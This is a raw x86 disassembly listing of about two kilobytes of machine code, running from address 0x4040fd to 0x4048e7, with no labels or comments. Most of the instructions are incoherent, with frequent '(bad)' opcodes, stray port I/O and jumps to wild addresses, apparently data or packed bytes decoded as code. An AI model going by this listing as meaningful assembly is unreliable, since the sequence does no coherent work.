  4040fd:	cmp    al,0x8
  4040ff:	hlt    
  404100:	sub    eax,DWORD PTR [ebx-0x7afcd496]
  404106:	xchg   edx,eax
  404107:	mov    eax,ds:0xb7e23b0f
  40410c:	sbb    eax,0xbaa1a93d
  404111:	sti    
  404112:	fstp   QWORD PTR [edi+edx*2-0x75]
  404116:	test   al,0x2
  404118:	cmp    esi,DWORD PTR [edi+edi*4]
  40411b:	jg     0x4040c9
  40411d:	popf   
  40411e:	xchg   edi,eax
  40411f:	xor    al,0x63
  404121:	out    dx,al
  404122:	lock outs dx,DWORD PTR ds:[esi]
  404124:	pusha  
  404125:	out    dx,al
  404126:	xor    DWORD PTR [eax-0x59aaf4d4],esi
  40412c:	test   DWORD PTR [eax+0x414472a5],ebx
  404132:	sub    bl,BYTE PTR [ecx+0x23]
  404135:	ror    ebx,1
  404137:	lahf   
  404138:	jnp    0x4040c2
  40413a:	xchg   ebx,eax
  40413b:	mov    eax,0x4806a03b
  404140:	adc    bh,BYTE PTR [ebp+0x35c23e94]
  404146:	not    DWORD PTR [edx-0x33]
  404149:	in     eax,0xd1
  40414b:	adc    dl,BYTE PTR [ebp-0x18]
  40414e:	cmp    BYTE PTR [ebp-0x3dd5ec24],cl
  404154:	xchg   DWORD PTR [esi-0x38],ecx
  404157:	pop    eax
  404158:	sahf   
  404159:	push   0x581b0447
  40415e:	and    DWORD PTR [ecx],ebp
  404160:	cmp    al,0xc0
  404162:	pop    edi
  404163:	xchg   ecx,eax
  404164:	(bad)  
  404165:	fld    QWORD PTR [esi-0x590419cf]
  40416b:	jbe    0x404195
  40416d:	div    BYTE PTR [edx-0x60]
  404170:	xor    esi,edi
  404172:	push   ebx
  404173:	add    DWORD PTR [esi],ebx
  404175:	sub    ah,BYTE PTR [edi-0x315a0fd0]
  40417b:	lods   eax,DWORD PTR ds:[esi]
  40417c:	nop
  40417d:	and    al,0x88
  40417f:	push   esp
  404180:	outs   dx,BYTE PTR ds:[esi]
  404181:	icebp  
  404182:	ja     0x40413c
  404184:	dec    edi
  404185:	mov    dl,BYTE PTR [edi]
  404187:	popa   
  404188:	mov    eax,ds:0x3adf7c3a
  40418d:	pop    es
  40418e:	and    bl,BYTE PTR fs:[esi+ebx*1+0x16]
  404193:	jo     0x40411d
  404195:	enter  0xf86e,0x55
  404199:	jmp    0x631b98d7
  40419e:	sti    
  40419f:	scas   eax,DWORD PTR es:[edi]
  4041a0:	mov    dl,0x74
  4041a2:	or     al,BYTE PTR [edi-0x40]
  4041a5:	fbstp  TBYTE PTR [esi]
  4041a7:	sti    
  4041a8:	test   DWORD PTR [edi-0x1b088634],ebp
  4041ae:	shr    DWORD PTR [ebp-0xf94081c],0x6
  4041b5:	cli    
  4041b6:	fs pop esi
  4041b8:	sbb    ah,BYTE PTR [eax+edx*8+0x13f6cd5d]
  4041bf:	jle    0x4041f6
  4041c1:	mov    esi,0x9ea21302
  4041c6:	int3   
  4041c7:	xchg   DWORD PTR cs:[ebx],esp
  4041ca:	clc    
  4041cb:	add    ah,al
  4041cd:	push   edi
  4041ce:	or     BYTE PTR [ecx],bh
  4041d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4041d1:	gs sub eax,0xae7bce67
  4041d7:	nop
  4041d8:	pop    esp
  4041d9:	mov    al,ds:0x6df92a54
  4041de:	sbb    al,0xe7
  4041e0:	add    al,0xc8
  4041e2:	test   al,0x3d
  4041e4:	repnz loop 0x404175
  4041e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4041e8:	jmp    0x310:0x840565be
  4041ef:	or     BYTE PTR [edi-0x6f2ccf21],cl
  4041f5:	int3   
  4041f6:	sub    eax,0xa8a0435e
  4041fb:	in     al,0xbb
  4041fd:	ins    BYTE PTR es:[edi],dx
  4041fe:	stc    
  4041ff:	dec    edx
  404200:	inc    ecx
  404201:	jnp    0x404281
  404203:	or     al,0xad
  404205:	xchg   DWORD PTR [esi+0x7a],ebx
  404208:	jl     0x4041fe
  40420a:	es jl  0x404253
  40420d:	xchg   esp,eax
  40420e:	or     eax,0x639033ad
  404213:	xchg   ebx,eax
  404214:	fidivr DWORD PTR [ecx]
  404216:	jne    0x40427b
  404218:	add    BYTE PTR [eax+0x572f1aad],cl
  40421e:	mov    cl,0x2d
  404220:	xchg   edx,eax
  404221:	stos   DWORD PTR es:[edi],eax
  404222:	jbe    0x404287
  404224:	push   0xe
  404226:	ss jo  0x404262
  404229:	jbe    0x40428e
  40422b:	pushf  
  40422c:	ins    BYTE PTR es:[edi],dx
  40422d:	imul   edi,DWORD PTR [edi+0x64],0xffffffa7
  404231:	dec    ebx
  404232:	dec    ebx
  404233:	stc    
  404234:	xor    al,0x2
  404236:	in     al,0xe1
  404238:	gs ss es xor eax,0x60c1409b
  404240:	mov    dh,cl
  404242:	sub    al,0x5e
  404244:	nop
  404245:	fild   WORD PTR [esi+edi*1-0xd]
  404249:	fwait
  40424a:	imul   edx,ebx,0x2b23f1b9
  404250:	jne    0x4042ab
  404252:	or     BYTE PTR [esi],ah
  404254:	add    BYTE PTR [esi+0x408e3e38],dh
  40425a:	ins    DWORD PTR es:[edi],dx
  40425b:	xor    dh,BYTE PTR [ebp+edx*8-0x18]
  40425f:	pop    ss
  404260:	adc    esi,DWORD PTR [edx-0x30]
  404263:	sub    bl,BYTE PTR [edx]
  404265:	inc    eax
  404266:	imul   ebx,DWORD PTR [ebp-0x24],0xffffffe7
  40426a:	mov    dl,0x30
  40426c:	out    0xda,eax
  40426e:	rcr    BYTE PTR [edi+0x4d],1
  404271:	sbb    DWORD PTR [ebx+0x7],0xfffffff2
  404275:	scas   eax,DWORD PTR es:[edi]
  404276:	jne    0x4042a2
  404278:	push   es
  404279:	outs   dx,BYTE PTR ds:[esi]
  40427a:	jae    0x4041fc
  40427c:	jo     0x40424e
  40427e:	out    dx,eax
  40427f:	fmul   st,st(3)
  404281:	adc    esi,ebp
  404283:	call   0xf16b:0xcc79e920
  40428a:	dec    ebp
  40428b:	mov    ecx,0x7a4389fc
  404290:	jg     0x404287
  404292:	jmp    0x78a9620b
  404297:	add    al,0x62
  404299:	call   0x1edec4aa
  40429e:	push   cs
  40429f:	inc    esi
  4042a0:	rcl    DWORD PTR [eax-0x326ea819],1
  4042a6:	je     0x4042cf
  4042a8:	mov    ebx,0xfba300f1
  4042ad:	dec    ebx
  4042ae:	cld    
  4042af:	adc    eax,DWORD PTR [ebx+0x2b]
  4042b2:	out    0xc3,eax
  4042b4:	enter  0x8e38,0x19
  4042b8:	dec    ebx
  4042b9:	adc    ebx,DWORD PTR [ebx-0x48687dd5]
  4042bf:	xchg   esp,eax
  4042c0:	(bad)  
  4042c1:	jns    0x40432a
  4042c3:	adc    BYTE PTR [eax-0x3e],ah
  4042c6:	xor    dh,dl
  4042c8:	call   0xe4dac416
  4042cd:	out    dx,al
  4042ce:	mov    al,ds:0x68f12d01
  4042d3:	inc    esi
  4042d4:	adc    edx,eax
  4042d6:	jb     0x40434b
  4042d8:	sahf   
  4042d9:	sar    ecx,1
  4042db:	mov    esi,0xb85949c0
  4042e0:	repz or al,bl
  4042e3:	pmaxsw mm3,QWORD PTR [ecx]
  4042e6:	test   eax,0xac0ba30a
  4042eb:	jle    0x4042c9
  4042ed:	mov    ebp,0x25680882
  4042f2:	sbb    ah,BYTE PTR [ecx+0x30]
  4042f5:	xchg   DWORD PTR [ecx+ebp*2-0x1c],ecx
  4042f9:	cmp    al,0x56
  4042fb:	(bad)  
  4042fc:	xor    esi,esi
  4042fe:	cmp    eax,0x6da93b50
  404303:	stc    
  404304:	and    ebp,DWORD PTR [ebp+0x385b7f07]
  40430a:	push   esp
  40430b:	retf   
  40430c:	push   ebx
  40430d:	push   0x3c
  40430f:	pop    esp
  404310:	into   
  404311:	push   cs
  404312:	mov    al,ds:0xf5a8ce4c
  404317:	add    eax,0x23d25901
  40431c:	cdq    
  40431d:	test   BYTE PTR [edx+0x1d5cfe5b],bl
  404323:	pminub mm0,QWORD PTR [eax]
  404326:	test   DWORD PTR [eax-0x4a055b1b],edi
  40432c:	ret    0xf1c
  40432f:	push   ds
  404330:	inc    edx
  404331:	ss pop ebx
  404333:	adc    BYTE PTR [ecx+0x5da615e],bh
  404339:	cs push 0x92e7486a
  40433f:	mov    ?,WORD PTR [esi]
  404341:	js     0x404384
  404343:	ret    
  404344:	dec    esi
  404345:	shr    BYTE PTR [esi],cl
  404347:	inc    eax
  404348:	pop    edx
  404349:	dec    ecx
  40434a:	mov    al,0x79
  40434c:	pop    edx
  40434d:	pop    ebp
  40434e:	and    eax,0xea2cc6a3
  404353:	dec    edx
  404354:	scas   eax,DWORD PTR es:[edi]
  404355:	xchg   DWORD PTR [edi],ecx
  404357:	sub    esi,ebx
  404359:	jecxz  0x40436b
  40435b:	icebp  
  40435c:	fisttp QWORD PTR [ebp+eax*8-0xa23852a]
  404363:	sub    BYTE PTR [eax-0x6cc909e3],ch
  404369:	jg     0x404341
  40436b:	inc    esi
  40436c:	add    BYTE PTR [edi+0x12],cl
  40436f:	sub    eax,0x4a33e4
  404374:	jge    0x404303
  404376:	sub    edi,DWORD PTR [edi]
  404378:	movntq (bad),mm1
  404379:	out    0xce,eax
  40437b:	out    0x64,eax
  40437d:	dec    edi
  40437e:	pop    edi
  40437f:	and    eax,0x9f68a540
  404384:	iret   
  404385:	push   eax
  404386:	dec    ebx
  404387:	div    DWORD PTR [ebx]
  404389:	outs   dx,DWORD PTR ds:[esi]
  40438a:	sbb    eax,0xc9f1e9be
  40438f:	pop    esi
  404390:	jmp    0xbbd8c1a4
  404395:	xchg   ecx,eax
  404396:	and    BYTE PTR [esi],cl
  404398:	xor    cl,dh
  40439a:	jbe    0x40438b
  40439c:	pop    esp
  40439d:	stos   BYTE PTR es:[edi],al
  40439e:	cdq    
  40439f:	jmp    0x5a9f:0x1c4d5bbe
  4043a6:	stos   DWORD PTR es:[edi],eax
  4043a7:	dec    ebp
  4043a8:	(bad)  
  4043a9:	xchg   esp,eax
  4043aa:	sub    al,0x85
  4043ac:	push   esi
  4043ad:	stc    
  4043ae:	mov    ds:0xd64e2c1b,eax
  4043b3:	xchg   esp,eax
  4043b4:	imul   ebp,DWORD PTR [eax-0x13],0xfae6a7cc
  4043bb:	and    edi,ebx
  4043bd:	adc    eax,0xdaca8ff3
  4043c2:	dec    esi
  4043c3:	int3   
  4043c4:	dec    eax
  4043c5:	fstp   DWORD PTR [edi]
  4043c7:	jnp    0x4043ca
  4043c9:	or     al,0xd0
  4043cb:	loopne 0x404357
  4043cd:	dec    esi
  4043ce:	or     cl,BYTE PTR [ebx+ebx*2+0x79]
  4043d2:	retf   
  4043d3:	(bad)  
  4043d4:	mov    ecx,0x37464fbc
  4043d9:	imul   esi,DWORD PTR [esi],0x2a
  4043dc:	jbe    0x404454
  4043de:	mov    al,ds:0xdc4f8b5d
  4043e3:	xlat   BYTE PTR ds:[ebx]
  4043e4:	das    
  4043e5:	mov    ebx,0x27e25a06
  4043ea:	cmp    eax,0xb87d1543
  4043ef:	cmc    
  4043f0:	mov    ds:0xb60f4b17,al
  4043f5:	lea    esi,[edi-0x2b3a3244]
  4043fb:	sbb    dl,al
  4043fd:	mul    DWORD PTR [ebp-0x63]
  404400:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404401:	dec    ebx
  404402:	inc    edx
  404403:	icebp  
  404404:	sahf   
  404405:	adc    edx,DWORD PTR [ebx]
  404407:	sbb    DWORD PTR [edi-0x1f4d9435],ebx
  40440d:	cmp    al,0x32
  40440f:	sub    al,0x60
  404411:	call   0x8dfc:0xce5b43aa
  404418:	jnp    0x404464
  40441a:	retf   
  40441b:	pop    ebp
  40441c:	ror    DWORD PTR [edi+0x3],cl
  40441f:	mov    eax,ds:0xac49cd33
  404424:	jnp    0x4043d9
  404426:	cmp    DWORD PTR [edx+0x2dbc567b],esp
  40442c:	(bad)  
  40442d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40442e:	jne    0x404445
  404430:	in     eax,0x1e
  404432:	sahf   
  404433:	xor    ecx,DWORD PTR [eax]
  404435:	mov    dh,0x70
  404437:	pusha  
  404438:	jecxz  0x4043e3
  40443a:	push   es
  40443b:	or     al,0x71
  40443d:	jmp    0x5fa1:0x6ea27d2
  404444:	addr16 pushf 
  404446:	sbb    ecx,0xe507a009
  40444c:	pop    esi
  40444d:	jnp    0x40446e
  40444f:	repnz das 
  404451:	or     al,0xfd
  404453:	xchg   ebp,eax
  404454:	loopne 0x404418
  404456:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404457:	xor    dl,BYTE PTR [eax+0x29]
  40445a:	retf   
  40445b:	xchg   edx,eax
  40445c:	push   0xffffffd6
  40445e:	pop    ss
  40445f:	dec    BYTE PTR [edi-0x3e6b094b]
  404465:	call   FWORD PTR [edx+0x1b0e568d]
  40446b:	popf   
  40446c:	addr16 dec eax
  40446e:	lods   eax,DWORD PTR ds:[esi]
  40446f:	mov    edx,0x85eae847
  404474:	sub    al,0x81
  404476:	cli    
  404477:	inc    edx
  404478:	out    dx,eax
  404479:	push   ecx
  40447a:	in     eax,dx
  40447b:	arpl   WORD PTR cs:[ebx-0x3e],di
  40447f:	jmp    0xbfbc6019
  404484:	sbb    BYTE PTR [edi-0x28],0xaf
  404488:	pop    esi
  404489:	dec    eax
  40448a:	ds sti 
  40448c:	scas   al,BYTE PTR es:[edi]
  40448d:	mov    ebp,0x270292e1
  404492:	mov    bl,0x9a
  404494:	mov    DWORD PTR [esi+0x10],ecx
  404497:	add    DWORD PTR [ebx-0x6f],eax
  40449a:	push   ecx
  40449b:	inc    edi
  40449c:	scas   eax,DWORD PTR es:[edi]
  40449d:	xchg   esi,eax
  40449e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40449f:	test   BYTE PTR [ebx+0x60],ah
  4044a2:	jmp    FWORD PTR [edi-0x3bc0e71e]
  4044a8:	leave  
  4044a9:	bound  edi,QWORD PTR [esi+0x6dd80856]
  4044af:	mov    eax,0xaf2c2566
  4044b4:	inc    edi
  4044b5:	jne    0x40451c
  4044b7:	cld    
  4044b8:	aas    
  4044b9:	scas   al,BYTE PTR es:[edi]
  4044ba:	xchg   edx,eax
  4044bb:	adc    ecx,0xfffffffc
  4044be:	or     edi,DWORD PTR [eax+0x40c0d0a2]
  4044c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4044c5:	test   BYTE PTR [ebx+0x5f0c0e7e],al
  4044cb:	ins    BYTE PTR es:[edi],dx
  4044cc:	jno    0x404484
  4044ce:	xchg   edx,eax
  4044cf:	shl    BYTE PTR [esi],0x84
  4044d2:	test   al,0x18
  4044d4:	xchg   ebp,eax
  4044d5:	(bad)  
  4044d6:	stos   BYTE PTR es:[edi],al
  4044d7:	sbb    eax,0x62bf01ee
  4044dc:	xchg   esp,eax
  4044dd:	imul   ebp,DWORD PTR [ebx],0xffffffde
  4044e0:	adc    esi,0x38
  4044e3:	std    
  4044e4:	sbb    BYTE PTR [eax-0x1f1ac4e0],al
  4044ea:	cmovp  esp,DWORD PTR [ebp-0x1d3030d5]
  4044f1:	add    eax,0x14f42b41
  4044f6:	aas    
  4044f7:	jl     0x4044f4
  4044f9:	adc    DWORD PTR [ebx+0x36b6eb70],edx
  4044ff:	aad    0x7a
  404501:	cmp    al,0x67
  404503:	and    al,0xbf
  404505:	inc    eax
  404506:	ja     0x404580
  404508:	jg     0x404505
  40450a:	pop    es
  40450b:	into   
  40450c:	and    esp,DWORD PTR [esi+0x5581ae40]
  404512:	dec    eax
  404513:	xlat   BYTE PTR ds:[ebx]
  404514:	retf   0xb659
  404517:	sub    BYTE PTR [ebp+0x2af7b0c4],ah
  40451d:	inc    ecx
  40451e:	jp     0x40457c
  404520:	shl    DWORD PTR [ebx+0x22],1
  404523:	mov    ah,0x39
  404525:	call   0x68251e83
  40452a:	imul   esp,DWORD PTR [esi-0x12],0x50653185
  404531:	cmp    eax,0x5f936015
  404536:	adc    DWORD PTR [edx],0x2f
  404539:	outs   dx,BYTE PTR ds:[esi]
  40453a:	out    dx,eax
  40453b:	jnp    0x404583
  40453d:	leave  
  40453e:	(bad)  
  40453f:	je     0x4045b1
  404541:	xor    DWORD PTR [edx],edx
  404543:	mov    esi,0xd34df405
  404548:	cld    
  404549:	ret    
  40454a:	push   0x34
  40454c:	das    
  40454d:	add    BYTE PTR [edi+ecx*2],bh
  404550:	push   esp
  404551:	cmp    DWORD PTR es:[ecx+0x2c],ebp
  404555:	das    
  404556:	jle    0x40454e
  404558:	fidiv  DWORD PTR [edx+0x32]
  40455b:	xchg   esi,eax
  40455c:	add    edx,DWORD PTR [ecx-0x34607061]
  404562:	or     bl,dl
  404564:	push   0xffffffff
  404566:	cmp    BYTE PTR gs:[edi],0x12
  40456a:	pop    esp
  40456b:	and    eax,0x8b86edfb
  404570:	jmp    0x404571
  404572:	stc    
  404573:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404574:	or     eax,0x129ec797
  404579:	arpl   si,bp
  40457b:	test   DWORD PTR [ebp-0x47f9bcb0],ecx
  404581:	mov    edx,0x2a67d3c5
  404586:	jmp    0x72a33545
  40458b:	push   ecx
  40458c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40458d:	pop    eax
  40458e:	icebp  
  40458f:	mov    dl,0x5d
  404591:	ffree  st(5)
  404593:	mov    ah,0x6a
  404595:	and    al,0x1d
  404597:	or     DWORD PTR [edx],esi
  404599:	(bad)  
  40459a:	loopne 0x40453e
  40459c:	aas    
  40459d:	fild   WORD PTR [ebp-0x286ad28b]
  4045a3:	cmp    al,0xe3
  4045a5:	sub    al,BYTE PTR [edi-0x3a266a80]
  4045ab:	jne    0x404613
  4045ad:	dec    edx
  4045ae:	outs   dx,DWORD PTR ds:[esi]
  4045af:	arpl   WORD PTR [ecx],dx
  4045b1:	sub    al,0x46
  4045b3:	lods   eax,DWORD PTR ds:[esi]
  4045b4:	and    DWORD PTR [ebp+esi*2-0x6],eax
  4045b8:	je     0x40455c
  4045ba:	aas    
  4045bb:	mov    cl,0x2e
  4045bd:	mov    edi,0x7f5224d0
  4045c2:	push   ebp
  4045c3:	outs   dx,DWORD PTR ds:[esi]
  4045c4:	sub    eax,0x6f474a54
  4045c9:	daa    
  4045ca:	dec    esp
  4045cb:	sub    eax,0xd6e38023
  4045d0:	sti    
  4045d1:	inc    edx
  4045d2:	sub    eax,0xbe1d4582
  4045d7:	ins    DWORD PTR es:[edi],dx
  4045d8:	mov    esp,0x32a3276e
  4045dd:	repnz mov bl,0xe9
  4045e0:	adc    al,0x69
  4045e2:	sub    eax,0x9777a18a
  4045e7:	mov    ebx,0xa64d7a0e
  4045ec:	inc    ebx
  4045ed:	pop    esp
  4045ee:	mov    ebx,0xd2b573e5
  4045f3:	loopne 0x4045f9
  4045f5:	mov    ecx,0x347bc18c
  4045fa:	arpl   WORD PTR [ebp-0x2cb76c81],ax
  404600:	lods   eax,DWORD PTR ds:[esi]
  404601:	popf   
  404602:	or     eax,0xca880fc1
  404607:	mov    al,ds:0x96f66669
  40460c:	loope  0x40460c
  40460e:	or     ebp,DWORD PTR [eax+0x17]
  404611:	push   ss
  404612:	es xchg ecx,eax
  404614:	sbb    dh,al
  404616:	fimul  DWORD PTR [edi-0x17]
  404619:	adc    al,ch
  40461b:	shr    DWORD PTR [ebx-0x4effc4ae],cl
  404621:	cmp    dh,BYTE PTR [edi+0xfa70eb6]
  404627:	scas   al,BYTE PTR es:[edi]
  404628:	dec    ebx
  404629:	dec    esp
  40462a:	in     al,0xe0
  40462c:	cs out 0x53,eax
  40462f:	xor    edi,edi
  404631:	pop    ss
  404632:	sbb    bh,BYTE PTR [edx+eax*2]
  404635:	xchg   ebx,eax
  404636:	dec    esp
  404637:	lods   al,BYTE PTR ds:[esi]
  404638:	sub    dh,BYTE PTR [esi+eax*8+0x54]
  40463c:	dec    ebx
  40463d:	lds    edx,FWORD PTR [eax+0x3c]
  404640:	push   0x2ca03ad7
  404645:	jg     0x4045e2
  404647:	shl    BYTE PTR [edi+0x5480d6f5],1
  40464d:	retf   
  40464e:	pusha  
  40464f:	pop    esi
  404650:	es scas eax,DWORD PTR es:[edi]
  404652:	mov    edx,0x4c6cc249
  404657:	mov    dl,dl
  404659:	fcomp  DWORD PTR [ecx]
  40465b:	lock cwde 
  40465d:	sbb    al,0x6d
  40465f:	push   esp
  404660:	xor    edx,DWORD PTR [ecx]
  404662:	push   ss
  404663:	add    eax,0x6d7d4142
  404668:	fisub  WORD PTR [ecx]
  40466a:	jp     0x404600
  40466c:	in     al,dx
  40466d:	adc    bl,0x73
  404670:	push   esp
  404671:	jge    0x404619
  404673:	mov    dh,0x30
  404675:	push   es
  404676:	cwde   
  404677:	cwde   
  404678:	jp     0x404675
  40467a:	pop    edx
  40467b:	shl    DWORD PTR [edi],0xff
  40467e:	lock cdq 
  404680:	xchg   edi,eax
  404681:	xchg   edi,eax
  404682:	jle    0x4046d0
  404684:	(bad)  
  404685:	mov    al,0x25
  404687:	mov    ds:0x738d9404,eax
  40468c:	fisttp QWORD PTR [ebx+0x8e1db5]
  404692:	cmp    eax,0x1903d29b
  404697:	fs dec esp
  404699:	mov    cs,ecx
  40469b:	stc    
  40469c:	clc    
  40469d:	mov    bh,0xf3
  40469f:	ret    
  4046a0:	inc    esi
  4046a1:	int    0x94
  4046a3:	and    DWORD PTR [edi+0x35],edi
  4046a6:	dec    esi
  4046a7:	dec    edi
  4046a8:	inc    ebp
  4046a9:	(bad)  
  4046ab:	or     edx,DWORD PTR [esi+0x20f82a83]
  4046b1:	inc    ecx
  4046b2:	mov    eax,ds:0xf36aff8
  4046b7:	xchg   edx,eax
  4046b8:	pop    ds
  4046b9:	dec    DWORD PTR [edi-0x24]
  4046bc:	sbb    edi,DWORD PTR ds:0x5da47c20
  4046c2:	inc    edx
  4046c3:	dec    edi
  4046c4:	fwait
  4046c5:	mov    ebp,0x58d32125
  4046ca:	fwait
  4046cb:	(bad)  
  4046cc:	and    bl,dh
  4046ce:	rcl    DWORD PTR [edx],1
  4046d0:	outs   dx,BYTE PTR ds:[esi]
  4046d1:	stos   BYTE PTR es:[edi],al
  4046d2:	ret    0x4ff3
  4046d5:	shl    BYTE PTR [ebx],1
  4046d7:	mov    edi,0xd14b39d2
  4046dc:	retf   
  4046dd:	or     eax,DWORD PTR [edi+0x56]
  4046e0:	inc    esi
  4046e1:	dec    edi
  4046e2:	rol    BYTE PTR [edi],1
  4046e4:	inc    edx
  4046e5:	pop    ds
  4046e6:	adc    BYTE PTR [ebx-0x48],al
  4046e9:	xor    cl,bl
  4046eb:	fiadd  WORD PTR [esi-0x5929070b]
  4046f1:	scas   eax,DWORD PTR es:[edi]
  4046f2:	mov    bl,0xb3
  4046f4:	inc    esi
  4046f5:	leave  
  4046f6:	mov    bh,0xe6
  4046f8:	je     0x404743
  4046fa:	fadd   DWORD PTR [eax-0x2c]
  4046fd:	xlat   BYTE PTR ds:[ebx]
  4046fe:	push   ss
  4046ff:	cmp    eax,0xed08dbbd
  404704:	pop    edx
  404705:	(bad)  
  404707:	or     BYTE PTR ds:0x702fa3d4,bl
  40470d:	loopne 0x4046eb
  40470f:	out    dx,eax
  404710:	ror    DWORD PTR [edi-0x26101667],1
  404716:	ins    BYTE PTR es:[edi],dx
  404717:	out    0xea,al
  404719:	sbb    ah,BYTE PTR [edx-0x7f2a5289]
  40471f:	test   dl,ah
  404721:	xchg   ecx,edi
  404723:	ret    0x9805
  404726:	mov    edx,0x220d33eb
  40472b:	mov    eax,0x66f77519
  404730:	retf   0x6818
  404733:	sbb    dh,al
  404735:	push   ecx
  404736:	or     eax,0x2f272f4c
  40473b:	mov    bl,0xeb
  40473d:	mov    esi,0xff6c3c18
  404742:	rcr    DWORD PTR [ebx-0x70],cl
  404745:	shl    cl,0x5b
  404748:	(bad)  
  404749:	sbb    al,0x31
  40474b:	jns    0x4047a4
  40474d:	xor    ch,BYTE PTR [ecx]
  40474f:	mov    al,0xfc
  404751:	push   ebp
  404752:	push   edx
  404753:	and    al,0xcc
  404755:	fs push ecx
  404757:	or     eax,0x2e3c81d2
  40475c:	call   0x2bb06b91
  404761:	fistp  WORD PTR [eax]
  404763:	sahf   
  404764:	out    0x99,al
  404766:	scas   eax,DWORD PTR es:[edi]
  404767:	add    eax,0x33af7f1f
  40476c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40476d:	in     eax,dx
  40476e:	sbb    BYTE PTR [esi-0x28],dh
  404771:	lahf   
  404772:	bound  ebp,QWORD PTR [esi+0x3192b268]
  404778:	or     ecx,DWORD PTR [ebp-0x10]
  40477b:	adc    al,0x8f
  40477d:	xor    al,0xe3
  40477f:	sti    
  404780:	or     BYTE PTR [ebp-0x16],dl
  404783:	push   ds
  404784:	cs xchg esi,eax
  404786:	jmp    0xd27ab896
  40478b:	or     ebp,DWORD PTR [edx-0x40d2cbe5]
  404791:	lock stc 
  404793:	xchg   edi,eax
  404794:	pop    esi
  404795:	jmp    0x404796
  404797:	pop    esp
  404798:	pop    esi
  404799:	sub    edx,DWORD PTR [edx+0x6fc8ff57]
  40479f:	mov    eax,ds:0xcf684ee8
  4047a4:	rcl    eax,cl
  4047a6:	dec    ebx
  4047a7:	lock in al,0xcf
  4047aa:	adc    esi,0xc6329ae0
  4047b0:	adc    ebp,eax
  4047b2:	xor    edx,DWORD PTR [edi]
  4047b4:	out    dx,eax
  4047b5:	je     0x404805
  4047b7:	test   BYTE PTR [ebp-0x51678e43],bh
  4047bd:	mov    ?,WORD PTR [ecx+0x22]
  4047c0:	or     DWORD PTR [edx-0x7c9d1d77],edi
  4047c6:	pop    ecx
  4047c7:	pop    esi
  4047c8:	jge    0x4047cc
  4047ca:	jb     0x40483e
  4047cc:	sbb    al,0xd8
  4047ce:	call   0x3d76c4ec
  4047d3:	out    dx,eax
  4047d4:	sar    BYTE PTR [ebp+0x4ddf20bc],cl
  4047da:	add    eax,0xe42de8d1
  4047df:	das    
  4047e0:	jg     0x404824
  4047e2:	mov    cs,ecx
  4047e4:	xor    bh,BYTE PTR [esi-0x556c8329]
  4047ea:	loop   0x40482e
  4047ec:	gs push ebp
  4047ee:	test   DWORD PTR ds:0x609f3a64,ebp
  4047f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4047f5:	add    eax,0x9143b68d
  4047fa:	scas   al,BYTE PTR es:[edi]
  4047fb:	test   eax,0x368b3fc1
  404800:	mov    ds:0x772d983c,al
  404805:	pushf  
  404806:	add    BYTE PTR fs:[esi-0x3e],cl
  40480a:	or     BYTE PTR [edx],cl
  40480c:	or     edx,DWORD PTR [edi-0x23]
  40480f:	cmp    al,0x93
  404811:	jmp    FWORD PTR [ecx-0x290fe09c]
  404817:	call   0x50d6c92c
  40481c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40481d:	icebp  
  40481e:	int    0xd8
  404820:	pop    edx
  404821:	and    esp,edx
  404823:	cmp    DWORD PTR fs:[edx-0x76cf8882],ebp
  40482a:	ror    DWORD PTR [ecx+0x7a],0x7b
  40482e:	test   eax,0xa8620144
  404833:	cs adc al,0xcb
  404836:	imul   BYTE PTR [edx+0x35]
  404839:	jge    0x404840
  40483b:	sar    BYTE PTR [ecx-0x710bfc93],1
  404841:	mov    ebx,0x7a6e92bd
  404846:	fstp   QWORD PTR [esi+0x5c]
  404849:	stos   DWORD PTR es:[edi],eax
  40484a:	adc    eax,0xbe194d11
  40484f:	dec    ebp
  404850:	mov    ah,BYTE PTR [edi]
  404852:	inc    esp
  404853:	ds sub eax,0xc256db22
  404859:	mov    edx,0x890ffb49
  40485e:	fiadd  DWORD PTR [eax-0x6]
  404861:	lods   al,BYTE PTR ds:[esi]
  404862:	fs sub al,0x95
  404865:	sub    dl,BYTE PTR [ebx+eiz*1]
  404868:	sbb    al,0x58
  40486a:	dec    edx
  40486b:	push   esi
  40486c:	jle    0x4048d2
  40486e:	adc    bh,cl
  404870:	jmp    0x7326a600
  404875:	iret   
  404876:	imul   esp,DWORD PTR [esi+0x5b0636b6],0x63
  40487d:	(bad)  
  40487e:	jnp    0x404805
  404880:	std    
  404881:	sub    al,0xf7
  404884:	mov    BYTE PTR [ecx+ebx*1+0x1b],bh
  404888:	fbld   TBYTE PTR [edx]
  40488a:	pop    edi
  40488b:	add    al,0xe2
  40488d:	inc    ecx
  40488e:	push   ebx
  40488f:	mov    ds:0x5898f214,al
  404894:	pop    ss
  404895:	shl    BYTE PTR ds:0xda6c37b,1
  40489b:	loop   0x4048d7
  40489d:	push   edi
  40489e:	test   edi,0xe7c877f2
  4048a4:	mov    bl,0x79
  4048a6:	add    bh,al
  4048a8:	xchg   cl,cl
  4048aa:	push   edx
  4048ab:	outs   dx,BYTE PTR ds:[esi]
  4048ac:	and    eax,0x9f1b6d1
  4048b1:	je     0x4048c4
  4048b3:	xchg   DWORD PTR [eax-0x1cee0529],eax
  4048b9:	test   BYTE PTR [edi+esi*2-0x1ff378fe],bh
  4048c0:	xor    BYTE PTR [edx-0x22],0xe0
  4048c4:	hlt    
  4048c5:	in     al,dx
  4048c6:	pop    ds
  4048c7:	scas   al,BYTE PTR es:[edi]
  4048c8:	(bad)  
  4048c9:	xchg   ecx,eax
  4048ca:	add    eax,0x8763fe65
  4048cf:	aas    
  4048d0:	ja     0x4048fd
  4048d2:	mov    al,ds:0x3a0e5f95
  4048d7:	xchg   edx,eax
  4048d8:	hlt    
  4048d9:	add    BYTE PTR [ebx-0x7355160],0x8d
  4048e0:	(bad)  
  4048e1:	test   DWORD PTR [ecx],0xa1fbd065
  4048e7:	mov    ebx,0xa8bf8cb
